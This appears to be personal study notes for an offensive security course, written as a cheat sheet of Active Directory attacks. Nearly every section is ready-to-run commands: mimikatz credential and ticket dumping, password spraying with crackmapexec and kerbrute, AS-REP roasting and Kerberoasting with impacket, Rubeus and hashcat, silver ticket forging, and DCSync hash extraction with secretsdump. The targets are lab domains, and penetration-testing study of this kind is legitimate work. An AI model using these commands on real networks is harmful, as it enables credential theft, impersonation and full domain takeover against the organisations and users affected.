# AD AuthN Basic
- Domain Expansion: I'd Win <img src="905673665fe7248681682d11b5739501.png" width="50">
## AuthN Type
1. NTLM 
   <img src="efc3ae731d085f29a1673782d583e64d-ad_ntlm.png" width="400">
2. Kerberos 
   <img src="b5e6b0ecb201daef973f507049049029-ad_kerbauth.png" width="400">

## Cached AD Credential
- w/ mimikatz
- ```privilege::debug``` to engage the SeDebugPrivlege8 privilege, which will allow us to interact with a process owned by another account.
- ``` sekurlsa::logonpasswords ``` get cached password that loggin this pc
- ``` sekurlsa::tickets ``` get cached ticket 

# Attack AD
## Password attack/ Spray
- ``` net accounts ``` get account policy e.g. logout time
1. DirectoryService (low & slow)
    - Run in Windows Env.
    - Get LDAP path (reference ch21)
    - ``` New-Object System.DirectoryServices.DirectoryEntry($LDAPpath, {username}, {passowrd}) ``` test if return normal result. If yes = correct , if false = nope 
    - DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1 #NoFullAutoInTheBuilding! 🔫🔫🔫🔫🔫🔫
2. SMB (Nois & slow)
    - Run in Kali Env
    - ``` crackmapexec smb {victim ip} -u users.txt -p 'YouAreFuckingGay' -d corp.com (--continue-on-success OR --shares) ``` 
    - If have local admin rights of that ac will show "Pwd3d!"
3. Kerberos TGT
    - Run in Windows/ Kali
    - Kerbrute: https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
    - ``` .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!" ```

## AS-REP Roasting
- If without Kerberos pre-authN
- Linux (Kali way) 
1. ``` impacket-GetNPUsers -dc-ip {domain controller ip!!}  -request -outputfile as-rep-roasted.txt corp.com/pete ``` Grap the AS-REP packet
2. ``` sudo hashcat -m 18200 as-rep-roasted.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -n 20 ``` 

- Windows (victim way)
1. Rubeus: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
2. ``` .\Rubeus.exe asreproast /nowrap ```
3. hashcat 

## Kerberoast (TGS-REP)
- Target service accounts
- The service ticket is encrypted using the SPN's password hash.
- m=13100 hashcat
- Linux (kali way)
1. ``` sudo impacket-GetUserSPNs -request -dc-ip {domain controller ip} corp.com/pete ```
2. hashcat

- Windows (victim way)
1. ``` .\Rubeus.exe kerberoast /outfile:hashes.kerberoast ```
2. hashcat crack

## Silver Tickets
- Forge service tickets step
- Target forging TGS
- Requires: 
    1. SPN password hash
    2. Domain SID
    3. Target SPN
- Use ticket accesss HTTP SPN resource
- Windows (victim way)
1. Find that service admin hash in cached data w/ ```mimikatz> sekurlsa::logonpasswords ``` 
2. Domain sid ```pwsh> whoami /user ``` ``` S-1-5-21-1987370270-658905905-1781884369-1105 ``` BUT ignore last segment ``` -1105```
3. Target SPN e.g. web6969.corp.com
4. Run ```mimikatz> kerberos::golden /sid:{sid} /domain:corp.com /ptt /target:{target spn} /service:http /rc4:{hashes} /user:{user you want to impersonate} ```
5. check tickets ```pwsh> klist ```
6. try access kerberos services: ``` iwr -UseDefaultCredentials http://web04 ```

- Linux (Kali way)
1. Impersonate Administrator via Silver Ticket (w/ service account):
2. Silver/Golden ticket ``` impacket-ticketer -nthash {nthash} -domain-sid {domain-sid} -domain nagoya-industries.com -spn {spn} -user-id 500 Administrator ```
3. get env var: ``` export KRB5CCNAME=$PWD/Administrator.ccache ```
4. Create file under /etc/brb5user.conf
   ```
    [libdefaults]
            default_realm = NAGOYA-INDUSTRIES.COM
            kdc_timesync = 1
            ccache_type = 4
            forwardable = true
            proxiable = true
        rdns = false
        dns_canonicalize_hostname = false
            fcc-mit-ticketflags = true

    [realms]        
            NAGOYA-INDUSTRIES.COM = {
                    kdc = nagoya.nagoya-industries.com
            }

    [domain_realm]
            .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
    ```

## Domain Controller Sync
- Only works in sync turned on DC (Production real world will have)
- Requires DC admin ( Replicating Directory Changes Permissions )
- NLTM module 1000
- Windows (Victim way)
  1. Login to DC admin
  2. Obtain any user credentials(hashed) ``` lsadump::dcsync /user:corp\dave ```
- Linux (Kali way)
1. ``` impacket-secretsdump -just-dc-user {target user to get} corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@{dc_ip} ```

